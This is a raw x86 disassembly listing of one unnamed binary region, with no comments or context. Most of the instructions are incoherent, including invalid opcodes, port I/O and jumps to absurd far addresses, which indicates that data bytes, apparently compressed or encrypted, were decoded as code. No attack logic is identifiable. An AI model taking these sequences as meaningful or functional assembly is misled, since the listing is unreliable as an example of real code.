  41dc74:	adc    BYTE PTR [edi-0x6ee2ce61],bl
  41dc7a:	popf   
  41dc7b:	mov    ecx,0x72c66122
  41dc80:	je     0x41dc52
  41dc82:	lods   al,BYTE PTR ds:[esi]
  41dc83:	dec    eax
  41dc84:	xchg   DWORD PTR [ebx-0x73],ebx
  41dc87:	add    BYTE PTR [eax+0x5b],ah
  41dc8a:	jl     0x41dc41
  41dc8c:	fs xchg edi,eax
  41dc8e:	outs   dx,DWORD PTR ds:[esi]
  41dc8f:	push   cs
  41dc90:	pop    edi
  41dc91:	sar    DWORD PTR [ecx+0x7d],1
  41dc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc95:	(bad)  
  41dc97:	add    eax,esi
  41dc99:	stos   DWORD PTR es:[edi],eax
  41dc9a:	out    0x8,al
  41dc9c:	pop    ecx
  41dc9d:	inc    ebx
  41dc9e:	mov    esi,ebx
  41dca0:	sbb    eax,0x24f02936
  41dca5:	xor    edi,ebp
  41dca7:	lsl    ebp,WORD PTR [edx-0x75]
  41dcab:	js     0x41dcd7
  41dcad:	xor    DWORD PTR [esi],ecx
  41dcaf:	pop    es
  41dcb0:	jge    0x41dc3a
  41dcb2:	lods   al,BYTE PTR ds:[esi]
  41dcb3:	add    bl,al
  41dcb5:	or     eax,0xefee66a6
  41dcba:	ret    
  41dcbb:	lods   eax,DWORD PTR ds:[esi]
  41dcbc:	sub    al,0xb8
  41dcbe:	mov    ds:0x93bc8647,eax
  41dcc3:	jns    0x41dcca
  41dcc5:	hlt    
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	out    0x1,eax
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	dec    ecx
  41dccd:	jl     0x41dd26
  41dccf:	nop
  41dcd0:	cmp    eax,esi
  41dcd2:	push   ebx
  41dcd3:	mov    esp,0x32c79e0b
  41dcd8:	scas   al,BYTE PTR es:[edi]
  41dcd9:	aas    
  41dcda:	pop    ebx
  41dcdb:	addr16 or al,0xf1
  41dcde:	pop    ecx
  41dcdf:	icebp  
  41dce0:	int    0x14
  41dce2:	adc    BYTE PTR [esi-0x3b],cl
  41dce5:	mov    eax,0xabb997e
  41dcea:	cmp    edi,DWORD PTR fs:[edx+0x1e]
  41dcee:	inc    ecx
  41dcef:	mov    dl,0x1e
  41dcf1:	cli    
  41dcf2:	mul    DWORD PTR [ecx-0x63]
  41dcf5:	dec    ecx
  41dcf6:	inc    esi
  41dcf7:	lods   al,BYTE PTR ds:[esi]
  41dcf8:	int    0x1f
  41dcfa:	jmp    0x56ce:0x5d13b2e
  41dd01:	ds mov dh,0x7e
  41dd04:	arpl   WORD PTR [ebx-0x5d],dx
  41dd07:	or     al,0x1f
  41dd09:	adc    eax,ecx
  41dd0b:	es sahf 
  41dd0d:	jecxz  0x41dd40
  41dd0f:	push   edx
  41dd10:	(bad)  [ebx+edx*1-0x7d382bb6]
  41dd17:	fs adc al,0x7d
  41dd1b:	xchg   DWORD PTR [edi],esi
  41dd1d:	mov    ebp,esi
  41dd1f:	aad    0x21
  41dd21:	inc    esi
  41dd22:	iret   
  41dd23:	sbb    dl,BYTE PTR [esi+0x7e]
  41dd26:	ja     0x41dd70
  41dd28:	cmp    al,0x4f
  41dd2a:	icebp  
  41dd2b:	fsubr  QWORD PTR [ebx+0x45]
  41dd2e:	xor    eax,0x9b1f7c48
  41dd33:	cmp    DWORD PTR [edi+0x13b7dee4],ebx
  41dd39:	inc    ecx
  41dd3a:	dec    eax
  41dd3b:	cmp    dh,BYTE PTR [ebp+0x55c51297]
  41dd41:	daa    
  41dd42:	pusha  
  41dd43:	jp     0x41dd12
  41dd45:	push   esp
  41dd46:	and    DWORD PTR [esp+ecx*1+0x7687259d],esp
  41dd4d:	(bad)  
  41dd4e:	pop    esi
  41dd4f:	inc    edx
  41dd50:	jb     0x41dd6e
  41dd52:	inc    eax
  41dd53:	mov    esp,0xdb17e997
  41dd58:	mov    ebx,0xb0d1af78
  41dd5d:	int    0x31
  41dd5f:	cld    
  41dd60:	pop    ebx
  41dd61:	jnp    0x41dda4
  41dd63:	mov    bl,0x8c
  41dd65:	jg     0x41ddc4
  41dd67:	scas   eax,DWORD PTR es:[edi]
  41dd68:	xor    bh,BYTE PTR [edx]
  41dd6a:	cdq    
  41dd6b:	dec    ebp
  41dd6c:	out    0xe1,al
  41dd6e:	(bad)  
  41dd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd70:	mov    al,ds:0x28312a02
  41dd75:	shl    dl,0x8a
  41dd78:	js     0x41dd14
  41dd7a:	cld    
  41dd7b:	stos   DWORD PTR es:[edi],eax
  41dd7c:	jmp    0xb7684722
  41dd81:	adc    BYTE PTR [edx-0x79742b6d],dh
  41dd87:	inc    ebx
  41dd88:	sub    esp,DWORD PTR [ebx+0x48]
  41dd8b:	cmp    eax,0x8cba98e1
  41dd90:	loope  0x41dd32
  41dd92:	imul   ebx,DWORD PTR [ebx-0x66b5c121],0xffffff96
  41dd99:	adc    eax,0xfbb3829c
  41dd9e:	pop    ebx
  41dd9f:	or     eax,0xbad2f9ce
  41dda4:	test   eax,0x3cda8f94
  41dda9:	jns    0x41de24
  41ddab:	sahf   
  41ddac:	dec    edi
  41ddad:	and    al,0x3a
  41ddaf:	sub    eax,0xb5051ff5
  41ddb4:	dec    ecx
  41ddb5:	adc    DWORD PTR [ebx+0x107d732d],ebp
  41ddbb:	xchg   ecx,eax
  41ddbc:	inc    ebp
  41ddbd:	scas   eax,DWORD PTR es:[edi]
  41ddbe:	cld    
  41ddbf:	ds pop esp
  41ddc1:	lods   eax,DWORD PTR ds:[esi]
  41ddc2:	xchg   esi,eax
  41ddc3:	outs   dx,BYTE PTR ds:[esi]
  41ddc4:	adc    al,0x9d
  41ddc6:	adc    al,0xf
  41ddc8:	out    dx,al
  41ddc9:	ror    DWORD PTR [esi+0x42],cl
  41ddcc:	cmp    edi,ebx
  41ddce:	mov    bl,0x62
  41ddd0:	push   ss
  41ddd1:	addr16 test eax,0xeccf56ae
  41ddd7:	movups xmm3,XMMWORD PTR [edx+0xf]
  41dddb:	mov    ecx,0x310840be
  41dde0:	sub    ebx,esp
  41dde2:	sub    eax,0x92e9d31c
  41dde7:	ret    
  41dde8:	loopne 0x41de59
  41ddea:	pushf  
  41ddeb:	push   es
  41ddec:	and    eax,0xfffffffd
  41ddef:	into   
  41ddf0:	ss jl  0x41ddc5
  41ddf3:	jbe    0x41ddfe
  41ddf5:	sbb    ebp,DWORD PTR [ebx+0x4b]
  41ddf8:	mov    al,0xfd
  41ddfa:	rcr    BYTE PTR [ebp+0x7e843617],cl
  41de00:	xchg   ecx,eax
  41de01:	pop    esi
  41de02:	in     al,dx
  41de03:	sbb    DWORD PTR [ebp+0x63],eax
  41de06:	icebp  
  41de07:	rcl    DWORD PTR [ebx],1
  41de09:	inc    BYTE PTR [ecx-0x59]
  41de0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de0d:	inc    ecx
  41de0e:	xchg   DWORD PTR [edx],ebx
  41de10:	pop    edi
  41de11:	mov    bh,0x1b
  41de13:	pop    esi
  41de14:	add    cl,BYTE PTR [edx-0x45613e7a]
  41de1a:	stos   DWORD PTR es:[edi],eax
  41de1b:	ins    DWORD PTR es:[edi],dx
  41de1c:	mov    dl,0xcc
  41de1e:	std    
  41de1f:	ficomp WORD PTR [edi]
  41de21:	int    0x1c
  41de23:	ret    
  41de24:	add    DWORD PTR [ebp-0x19c97f6c],edi
  41de2a:	or     al,BYTE PTR [edx+0x342eeae3]
  41de30:	adc    BYTE PTR [edi+0x75],bh
  41de33:	push   esp
  41de34:	sar    eax,cl
  41de36:	out    dx,eax
  41de37:	aas    
  41de38:	mov    esp,0x2c59412c
  41de3d:	mov    esp,eax
  41de3f:	(bad)  
  41de40:	push   ebx
  41de41:	fnstsw WORD PTR [ebx-0x72]
  41de44:	scas   eax,DWORD PTR es:[edi]
  41de45:	pop    edi
  41de46:	sbb    BYTE PTR [ebp+0x19975f65],al
  41de4c:	jg     0x41de2a
  41de4e:	enter  0xc524,0x7d
  41de52:	test   BYTE PTR [ecx-0x48],bh
  41de55:	test   al,0x7e
  41de57:	mov    DWORD PTR [edi+0x6],ebp
  41de5a:	ss sub eax,0x4d8043c9
  41de60:	mov    bl,0x38
  41de62:	je     0x41ddf5
  41de64:	pop    eax
  41de65:	loop   0x41de34
  41de67:	popf   
  41de68:	push   edx
  41de69:	fbstp  TBYTE PTR [ebx+0x3f4a845f]
  41de6f:	adc    DWORD PTR [ebx-0x33],esi
  41de72:	ss pushf 
  41de74:	mov    ebp,0x8c127f84
  41de79:	call   0xddc4:0x3100322e
  41de80:	in     eax,dx
  41de81:	sbb    eax,0xf8296b19
  41de86:	ja     0x41ded7
  41de88:	cwde   
  41de89:	ds jecxz 0x41deb4
  41de8c:	ja     0x41de96
  41de8e:	jno    0x41de39
  41de90:	xor    eax,0xc669a6a
  41de95:	push   edi
  41de96:	sub    al,0x1c
  41de98:	mov    eax,ds:0xde615f24
  41de9d:	dec    esi
  41de9e:	mov    al,0x4d
  41dea0:	pop    ebp
  41dea1:	xchg   edi,eax
  41dea2:	inc    esi
  41dea3:	add    edx,eax
  41dea5:	xlat   BYTE PTR ds:[ebx]
  41dea6:	test   al,0x78
  41dea8:	adc    eax,0x9bb6fb38
  41dead:	cs jo  0x41de6b
  41deb0:	pusha  
  41deb1:	cmp    al,BYTE PTR [eax+0x0]
  41deb4:	fld    st(2)
  41deb6:	add    eax,0xddcf1f49
  41debb:	ror    al,cl
  41debd:	outs   dx,DWORD PTR ds:[esi]
  41debe:	clc    
  41debf:	sar    BYTE PTR [edx+0x4b],cl
  41dec2:	test   DWORD PTR [ecx],edx
  41dec4:	in     al,dx
  41dec5:	cmc    
  41dec6:	add    DWORD PTR [eax],eax
  41dec8:	xlat   BYTE PTR ds:[ebx]
  41dec9:	add    DWORD PTR [eax],eax
  41decb:	add    dh,dh
  41decd:	dec    esi
  41dece:	mov    esi,0x4a01024
  41ded3:	jne    0x41def3
  41ded5:	jg     0x41df4f
  41ded7:	mov    ah,0x8
  41ded9:	mov    es,WORD PTR ds:0xd7a78575
  41dedf:	cmp    bl,BYTE PTR [esi+0x3cc4fe61]
  41dee5:	mov    eax,ds:0xcb199c8a
  41deea:	or     eax,0xbacdcbcd
  41deef:	stos   BYTE PTR es:[edi],al
  41def0:	in     eax,0x2b
  41def2:	jno    0x41df32
  41def4:	mov    eax,ds:0x9ebdcbbe
  41def9:	in     eax,0x98
  41defb:	mov    al,0x60
  41defd:	call   0x257d:0xbca87d8a
  41df04:	ds inc ecx
  41df06:	int    0xab
  41df08:	ret    
  41df09:	stos   DWORD PTR es:[edi],eax
  41df0a:	aaa    
  41df0b:	ret    
  41df0c:	test   al,0x82
  41df0e:	mov    ebx,0x88cc3e9b
  41df13:	in     eax,dx
  41df14:	ficomp WORD PTR [edi+0x4]
  41df17:	mov    WORD PTR [edi+0x16],?
  41df1a:	popf   
  41df1b:	mov    dl,0x9
  41df1d:	dec    esp
  41df1e:	inc    esp
  41df1f:	jge    0x41dec7
  41df21:	int3   
  41df22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df24:	enter  0xba6d,0x61
  41df28:	and    eax,0x335eb443
  41df2d:	mov    ds:0xd00c37fd,al
  41df32:	pusha  
  41df33:	enter  0x4bf,0x15
  41df37:	pop    ecx
  41df38:	jbe    0x41deec
  41df3a:	dec    edi
  41df3b:	shr    BYTE PTR ds:0x2b06f6ee,0xbc
  41df42:	ret    
  41df43:	pushf  
  41df44:	or     BYTE PTR [edx+0x525ce1c4],cl
  41df4a:	xlat   BYTE PTR ds:[ebx]
  41df4b:	ins    DWORD PTR es:[edi],dx
  41df4c:	lock mov ds:0xba1aa6b4,al
  41df52:	enter  0x405,0x64
  41df56:	inc    edx
  41df57:	mov    ebp,0x278841a8
  41df5c:	sbb    ebx,eax
  41df5e:	ret    
  41df5f:	mov    WORD PTR [esi+0x34],gs
  41df62:	dec    edi
  41df63:	rcr    BYTE PTR [esi],1
  41df65:	rcl    DWORD PTR [ebp-0x20ab1cd],cl
  41df6b:	pop    ebp
  41df6c:	loope  0x41df04
  41df6e:	push   ss
  41df6f:	dec    ebp
  41df70:	dec    edi
  41df71:	jl     0x41df47
  41df73:	dec    ebp
  41df74:	inc    esi
  41df75:	adc    DWORD PTR [eax+0x6],esp
  41df78:	jmp    0xe5ad:0x60150f60
  41df7f:	sbb    eax,0x3462ab1f
  41df84:	jge    0x41df47
  41df86:	popa   
  41df87:	dec    BYTE PTR [eax+esi*4+0x5e]
  41df8b:	adc    BYTE PTR [eax+eiz*8-0x2f8cc2d],dh
  41df92:	popa   
  41df93:	je     0x41df3b
  41df95:	mov    ebx,0x98d02fff
  41df9a:	ror    BYTE PTR [ecx-0x1d861d75],cl
  41dfa0:	das    
  41dfa1:	(bad)  
  41dfa2:	nop
  41dfa3:	jp     0x41dff2
  41dfa5:	mov    ah,0xdc
  41dfa7:	inc    edx
  41dfa8:	jnp    0x41df92
  41dfaa:	arpl   WORD PTR [ebx+0x582283d7],bp
  41dfb0:	mov    edx,0xe8faa11f
  41dfb5:	inc    edx
  41dfb6:	leave  
  41dfb7:	xchg   esi,eax
  41dfb8:	int3   
  41dfb9:	and    DWORD PTR [eax+eax*1-0x6d],ecx
  41dfbd:	xchg   dh,ah
  41dfbf:	xchg   esi,eax
  41dfc0:	mov    edx,DWORD PTR [edi]
  41dfc2:	dec    eax
  41dfc3:	sbb    al,0xe
  41dfc5:	cld    
  41dfc6:	xor    esp,DWORD PTR [esi-0x108cc973]
  41dfcc:	scas   eax,DWORD PTR es:[edi]
  41dfcd:	xor    edx,ecx
  41dfcf:	jae    0x41df7c
  41dfd1:	inc    cx
  41dfd3:	in     al,0x78
  41dfd5:	cmp    eax,0xd40b10cf
  41dfda:	jl     0x41dfa7
  41dfdc:	lods   al,BYTE PTR ds:[esi]
  41dfdd:	scas   al,BYTE PTR es:[edi]
  41dfde:	in     al,dx
  41dfdf:	push   0x3a
  41dfe1:	xchg   ebx,eax
  41dfe2:	adc    BYTE PTR [ecx],ch
  41dfe4:	jo     0x41df86
  41dfe6:	mov    ah,0xab
  41dfe8:	cld    
  41dfe9:	inc    eax
  41dfea:	push   ds
  41dfeb:	mov    ch,0x53
  41dfed:	mov    edi,0x54a9755a
  41dff2:	jne    0x41e022
  41dff4:	inc    edi
  41dff5:	xor    ebp,edi
  41dff7:	rcl    dl,1
  41dff9:	dec    ebx
  41dffa:	jl     0x41df7e
  41dffc:	cmp    DWORD PTR [ebx+eiz*8],edx
  41dfff:	and    DWORD PTR [ecx-0x36],0x78
  41e003:	xchg   edi,eax
  41e004:	ins    DWORD PTR es:[edi],dx
  41e005:	(bad)  [edx]
  41e007:	mov    ebp,0x5fa1e224
  41e00c:	xor    al,0x4f
  41e00e:	jmp    0x41e059
  41e010:	ins    BYTE PTR es:[edi],dx
  41e011:	dec    edi
  41e012:	hlt    
  41e013:	cmp    al,0x1a
  41e015:	xor    bl,bl
  41e017:	ins    DWORD PTR es:[edi],dx
  41e018:	es and al,0x3d
  41e01b:	mov    al,ds:0x88ff349c
  41e020:	mov    dh,0x29
  41e022:	mov    edx,0x3208bc2
  41e027:	nop
  41e028:	clc    
  41e029:	scas   eax,DWORD PTR es:[edi]
  41e02a:	push   esp
  41e02b:	jmp    0x41dff5
  41e02d:	adc    esi,DWORD PTR [esi]
  41e02f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e031:	push   edx
  41e032:	lods   al,BYTE PTR ds:[esi]
  41e033:	scas   al,BYTE PTR es:[edi]
  41e034:	shl    BYTE PTR [edi-0x257e0513],0x87
  41e03b:	mov    esp,0xca0bd023
  41e040:	in     al,dx
  41e041:	pushf  
  41e042:	inc    BYTE PTR [edi+edx*2]
  41e045:	push   eax
  41e046:	mov    ds:0xb25cc87a,al
  41e04b:	mov    dl,0x80
  41e04d:	add    eax,DWORD PTR [ebp+0x636bdef]
  41e053:	data16 jae 0x41e070
  41e056:	push   0xffffffb3
  41e058:	sbb    al,0x15
  41e05a:	jnp    0x41e075
  41e05c:	(bad)  
  41e05d:	mov    al,0xf8
  41e05f:	xchg   ebp,eax
  41e060:	repz mov al,BYTE PTR [edx]
  41e063:	cmp    al,0x7b
  41e065:	imul   esi,DWORD PTR [edi-0xd89d80d],0x30879476
  41e06f:	fdivr  QWORD PTR [ebp+eiz*4+0x40]
  41e073:	retf   
  41e074:	mov    esp,0x5b4128af
  41e079:	inc    esp
  41e07a:	test   BYTE PTR [edi-0x32fc7a2d],ch
  41e080:	jmp    0xe75fb725
  41e085:	pop    ebp
  41e086:	fld    DWORD PTR [ecx-0x2f]
  41e089:	push   esi
  41e08a:	adc    bl,0xcd
  41e08d:	cmp    al,dh
  41e08f:	sti    
  41e090:	jecxz  0x41e078
  41e092:	jb     0x41e046
  41e094:	jge    0x41e063
  41e096:	mov    dl,0x4c
  41e098:	mov    al,0x2d
  41e09a:	fnop   
  41e09c:	mov    al,ds:0x2b15c79b
  41e0a1:	push   ss
  41e0a2:	add    eax,DWORD PTR [eax]
  41e0a4:	add    BYTE PTR [eax],al
  41e0a6:	inc    ebx
  41e0a7:	add    BYTE PTR [eax+eax*1],al
  41e0aa:	inc    ebx
  41e0ab:	add    BYTE PTR [eax],cl
  41e0ad:	add    BYTE PTR [ebx+0x0],al
  41e0b0:	or     al,0x0
  41e0b2:	inc    ebx
  41e0b3:	add    BYTE PTR [eax],dl
  41e0b5:	add    BYTE PTR [ebx+0x0],al
  41e0b8:	adc    al,0x0
  41e0ba:	inc    ebx
  41e0bb:	add    BYTE PTR [eax],bl
  41e0bd:	add    BYTE PTR [ebx+0x0],al
  41e0c0:	sbb    al,0x0
  41e0c2:	inc    ebx
  41e0c3:	add    BYTE PTR [eax],al
  41e0c5:	adc    BYTE PTR [ebx+0x0],al
  41e0c8:	add    al,0x10
  41e0ca:	inc    ebx
  41e0cb:	add    BYTE PTR [eax],cl
  41e0cd:	adc    BYTE PTR [ebx+0x0],al
  41e0d0:	or     al,0x10
  41e0d2:	inc    ebx
  41e0d3:	add    BYTE PTR [eax],dl
  41e0d5:	adc    BYTE PTR [ebx+0x0],al
  41e0d8:	adc    al,0x10
  41e0da:	inc    ebx
  41e0db:	add    BYTE PTR [eax],bl
  41e0dd:	adc    BYTE PTR [ebx+0x0],al
  41e0e0:	sbb    al,0x10
  41e0e2:	inc    ebx
  41e0e3:	add    BYTE PTR [eax],al
  41e0e5:	and    BYTE PTR [ebx+0x0],al
  41e0e8:	add    al,0x20
  41e0ea:	inc    ebx
  41e0eb:	add    BYTE PTR [eax],cl
  41e0ed:	and    BYTE PTR [ebx+0x0],al
  41e0f0:	or     al,0x20
  41e0f2:	inc    ebx
  41e0f3:	add    BYTE PTR [eax],dl
  41e0f5:	and    BYTE PTR [ebx+0x0],al
  41e0f8:	adc    al,0x20
  41e0fa:	inc    ebx
  41e0fb:	add    BYTE PTR [eax],bl
  41e0fd:	and    BYTE PTR [ebx+0x0],al
  41e100:	sbb    al,0x20
  41e102:	inc    ebx
  41e103:	add    BYTE PTR [eax+0x66],bh
  41e106:	ins    BYTE PTR es:[edi],dx
  41e107:	jp     0x41e160
  41e109:	jbe    0x41e152
  41e10b:	ja     0x41e150
  41e10d:	js     0x41e157
  41e10f:	jno    0x41e161
  41e111:	arpl   WORD PTR [ebx+0x6f],dx
  41e114:	inc    edi
  41e115:	dec    esi
  41e116:	outs   dx,DWORD PTR ds:[esi]
  41e117:	pop    ecx
  41e118:	inc    edi
  41e119:	jb     0x41e162
  41e11b:	jns    0x41e193
  41e11d:	inc    ecx
  41e11e:	pop    eax
  41e11f:	dec    esp
  41e120:	add    BYTE PTR [eax],al
  41e122:	add    BYTE PTR [eax],al
  41e124:	lods   al,BYTE PTR ds:[esi]
  41e125:	in     al,0x41
  41e127:	add    BYTE PTR [esp+eiz*8-0x1c93ffbf],dh
  41e12e:	inc    ecx
  41e12f:	add    bh,ch
  41e131:	or     esi,DWORD PTR [edx+0x304e790e]
  41e137:	dec    esi
  41e138:	xchg   DWORD PTR [edi+0x3d],ecx
  41e13b:	dec    esi
  41e13c:	scas   eax,DWORD PTR es:[edi]
  41e13d:	dec    edi
  41e13e:	ds dec esi
  41e140:	js     0x41e190
  41e142:	cmp    ecx,DWORD PTR [esi-0x64]
  41e145:	dec    edi
  41e146:	inc    esp
  41e147:	dec    esi
  41e148:	jae    0x41e198
  41e14a:	inc    ecx
  41e14b:	dec    esi
  41e14c:	xor    BYTE PTR [esi+0x40],cl
  41e14f:	dec    esi
  41e150:	pop    esp
  41e151:	pop    ebp
  41e152:	pop    edi
  41e153:	push   edx
  41e154:	cmp    DWORD PTR [esi+0x79],ecx
  41e157:	dec    esi
  41e158:	xor    BYTE PTR [esi-0x79],cl
  41e15b:	dec    edi
  41e15c:	cmp    eax,0x3e4faf4e
  41e161:	dec    esi
  41e162:	js     0x41e1b2
  41e164:	cmp    ecx,DWORD PTR [esi-0x64]
  41e167:	dec    edi
  41e168:	inc    esp
  41e169:	dec    esi
  41e16a:	mov    DWORD PTR [edi+0x41],ecx
  41e16d:	dec    esi
  41e16e:	xor    BYTE PTR [esi+0x40],cl
  41e171:	dec    esi
  41e172:	pop    esp
  41e173:	ins    DWORD PTR es:[edi],dx
  41e174:	pop    edi
  41e175:	bound  edi,QWORD PTR [ecx]
  41e177:	dec    esi
  41e178:	jns    0x41e1c8
  41e17a:	xor    BYTE PTR [esi-0x80],cl
  41e17d:	dec    edi
  41e17e:	cmp    eax,0x394e734e
  41e183:	dec    esi
  41e184:	mov    ds:0x304e3a4f,al
  41e189:	dec    esi
  41e18a:	inc    esi
  41e18b:	dec    esi
  41e18c:	pop    esp
  41e18d:	jge    0x41e1ee
  41e18f:	jb     0x41e200
  41e191:	sub    BYTE PTR [esi-0x7d],0x7e
  41e195:	xchg   ebx,eax
  41e196:	jns    0x41e128
  41e198:	aas    
  41e199:	dec    esi
  41e19a:	test   BYTE PTR [edi+0x30],cl
  41e19d:	dec    esi
  41e19e:	test   BYTE PTR [edi+0x3c],cl
  41e1a1:	dec    esi
  41e1a2:	mov    ds:0x734e394f,al
  41e1a7:	dec    esi
  41e1a8:	inc    ebp
  41e1a9:	dec    esi
  41e1aa:	xor    BYTE PTR [esi+0x44],cl
  41e1ad:	dec    esi
  41e1ae:	pop    esp
  41e1af:	lea    ebx,[edi-0x7e]
  41e1b2:	outs   dx,DWORD PTR ds:[esi]
  41e1b3:	xchg   edx,eax
  41e1b4:	outs   dx,BYTE PTR ds:[esi]
  41e1b5:	xchg   ebx,eax
  41e1b6:	jle    0x41e15b
  41e1b8:	jns    0x41e15a
  41e1ba:	aas    
  41e1bb:	dec    esi
  41e1bc:	test   BYTE PTR [edi+0x30],cl
  41e1bf:	dec    esi
  41e1c0:	test   BYTE PTR [edi+0x3c],cl
  41e1c3:	dec    esi
  41e1c4:	mov    ds:0x894e394f,al
  41e1c9:	dec    edi
  41e1ca:	inc    ebp
  41e1cb:	dec    esi
  41e1cc:	xor    BYTE PTR [esi+0x44],cl
  41e1cf:	dec    esi
  41e1d0:	pop    esp
  41e1d1:	popf   
  41e1d2:	pop    edi
  41e1d3:	xchg   edx,eax
  41e1d4:	outs   dx,DWORD PTR ds:[esi]
  41e1d5:	mov    ds:0xb37ea36e,al
  41e1da:	jns    0x41e18c
  41e1dc:	aas    
  41e1dd:	dec    esi
  41e1de:	mov    cs,WORD PTR [edi+0x30]
  41e1e1:	dec    esi
  41e1e2:	lods   al,BYTE PTR ds:[esi]
  41e1e3:	dec    edi
  41e1e4:	cmp    eax,0x394e734e
  41e1e9:	dec    esi
  41e1ea:	mov    eax,ds:0x304e3a4f
  41e1ef:	dec    esi
  41e1f0:	inc    esp
  41e1f1:	dec    esi
  41e1f2:	pop    esp
  41e1f3:	lods   eax,DWORD PTR ds:[esi]
  41e1f4:	pop    edi
  41e1f5:	mov    ds:0xb36eb26f,al
  41e1fa:	jle    0x41e1bf
  41e1fc:	jns    0x41e1be
  41e1fe:	aas    
  41e1ff:	dec    esi
  41e200:	mov    cs,WORD PTR [edi+0x30]
  41e203:	dec    esi
  41e204:	lods   al,BYTE PTR ds:[esi]
  41e205:	dec    edi
  41e206:	cmp    eax,0x394e7e4e
  41e20b:	dec    esi
  41e20c:	lahf   
  41e20d:	dec    edi
  41e20e:	cmp    ecx,DWORD PTR [esi+0x30]
  41e211:	dec    esi
  41e212:	inc    ebp
  41e213:	dec    esi
  41e214:	pop    esp
  41e215:	mov    ebp,0xc26fb25f
  41e21a:	outs   dx,BYTE PTR ds:[esi]
  41e21b:	ret    
  41e21c:	jle    0x41e1f1
  41e21e:	jns    0x41e1f0
  41e220:	aas    
  41e221:	dec    esi
  41e222:	mov    cs,WORD PTR [edi+0x30]
  41e225:	dec    esi
  41e226:	lods   al,BYTE PTR ds:[esi]
  41e227:	dec    edi
  41e228:	cmp    eax,0x394f804e
  41e22d:	dec    esi
  41e22e:	lods   al,BYTE PTR ds:[esi]
  41e22f:	dec    edi
  41e230:	cmp    cl,BYTE PTR [esi+0x30]
  41e233:	dec    esi
  41e234:	inc    esi
  41e235:	dec    esi
  41e236:	pop    esp
  41e237:	int    0x5f
  41e239:	ret    0xd26f
  41e23c:	outs   dx,BYTE PTR ds:[esi]
  41e23d:	sar    DWORD PTR [esi-0x1d],cl
  41e240:	jns    0x41e222
  41e242:	aas    
  41e243:	dec    esi
  41e244:	mov    cs,WORD PTR [edi+0x30]
  41e247:	dec    esi
  41e248:	lods   al,BYTE PTR ds:[esi]
  41e249:	dec    edi
  41e24a:	cmp    eax,0x394f834e
  41e24f:	dec    esi
  41e250:	mov    ds:0x304e3a4f,al
  41e255:	dec    esi
  41e256:	inc    esp
  41e257:	dec    esi
  41e258:	pop    esp
  41e259:	fstp   QWORD PTR [edi-0x2e]
  41e25c:	outs   dx,DWORD PTR ds:[esi]
  41e25d:	loop   0x41e2cd
  41e25f:	jecxz  0x41e2df
  41e261:	repz jns 0x41e254
  41e264:	aas    
  41e265:	dec    esi
  41e266:	lea    ecx,[edi+0x30]
  41e269:	dec    esi
  41e26a:	lahf   
  41e26b:	dec    edi
  41e26c:	cmp    eax,0x3c4fa04e
  41e271:	dec    esi
  41e272:	xor    BYTE PTR [esi+0x3f],cl
  41e275:	dec    esi
  41e276:	pop    esp
  41e277:	in     eax,dx
  41e278:	pop    edi
  41e279:	loop   0x41e2ea
  41e27b:	repnz outs dx,BYTE PTR ds:[esi]
  41e27d:	repz jle 0x41e283
  41e280:	jns    0x41e282
  41e282:	jle    0x41e297
  41e284:	jns    0x41e296
  41e286:	cmp    al,0x4e
  41e288:	jg     0x41e2d8
  41e28a:	xor    BYTE PTR [esi-0x65],cl
  41e28d:	dec    edi
  41e28e:	xor    cl,BYTE PTR [esi-0x80]
  41e291:	dec    edi
  41e292:	cmp    al,0x4e
  41e294:	lods   eax,DWORD PTR ds:[esi]
  41e295:	dec    edi
  41e296:	cmp    ecx,DWORD PTR [esi+0x30]
  41e299:	dec    esi
  41e29a:	inc    ebp
  41e29b:	dec    esi
  41e29c:	pop    esp
  41e29d:	or     eax,0x126f025f
  41e2a2:	outs   dx,BYTE PTR ds:[esi]
  41e2a3:	adc    edi,DWORD PTR [esi+0x23]
  41e2a6:	jns    0x41e2c8
  41e2a8:	aas    
  41e2a9:	dec    esi
  41e2aa:	add    BYTE PTR [eax],al
  41e2ac:	xor    al,0xe1
  41e2ae:	inc    ecx
  41e2af:	add    BYTE PTR [eax],ch
  41e2b1:	jecxz  0x41e2f4
  41e2b3:	add    BYTE PTR [eax],dh
  41e2b5:	jecxz  0x41e2f8
  41e2b7:	add    BYTE PTR [eax+0x240041e4],bh
  41e2bd:	in     al,0x41
  41e2bf:	add    BYTE PTR [eax+0x100041e4],ch
  41e2c5:	jecxz  0x41e308
  41e2c7:	add    BYTE PTR [ebx+eiz*8],dl
  41e2ca:	inc    ecx
  41e2cb:	add    BYTE PTR [esp+eiz*8-0x1c87ffbf],ah
  41e2d2:	inc    ecx
  41e2d3:	add    BYTE PTR ds:0x36f89ca9,cl
  41e2d9:	mov    edx,0xe32cf89c
  41e2de:	inc    ecx
  41e2df:	add    ah,bl
  41e2e1:	jecxz  0x41e324
  41e2e3:	add    al,dh
  41e2e5:	jecxz  0x41e328
  41e2e7:	add    ah,bh
  41e2e9:	jecxz  0x41e32c
  41e2eb:	add    BYTE PTR [esp+eiz*8],cl
  41e2ee:	inc    ecx
  41e2ef:	add    BYTE PTR [ebx+eiz*8+0x41],ah
  41e2f3:	add    BYTE PTR [eax],dh
  41e2f5:	loope  0x41e338
  41e2f7:	add    BYTE PTR [ebx+eiz*8-0x1c8bffbf],al
  41e2fe:	inc    ecx
  41e2ff:	add    BYTE PTR [esp+eiz*8-0x7a49ffbf],bh
  41e306:	pushf  
  41e307:	clc    
  41e308:	sbb    DWORD PTR [ebx],ecx
  41e30a:	pop    ss
  41e30b:	cmp    DWORD PTR [eax],0x140041e3
  41e311:	sbb    al,0x16
  41e313:	or     DWORD PTR [eax],0x7050d
  41e319:	add    BYTE PTR [eax+0x0],al
  41e31c:	cmp    al,BYTE PTR [edx+0x3e]
  41e31f:	ds retf 0x42e7
  41e323:	add    BYTE PTR [ebp+0x55],ch
  41e326:	inc    esp
  41e327:	imul   ecx,DWORD PTR [eax],0x86275fa
  41e32d:	in     eax,dx
  41e32e:	inc    BYTE PTR [edi]
  41e330:	aas    
  41e331:	cli    
  41e332:	mov    ds:0x41e32005,eax
  41e337:	add    BYTE PTR [ebp-0x4a07636b],dh
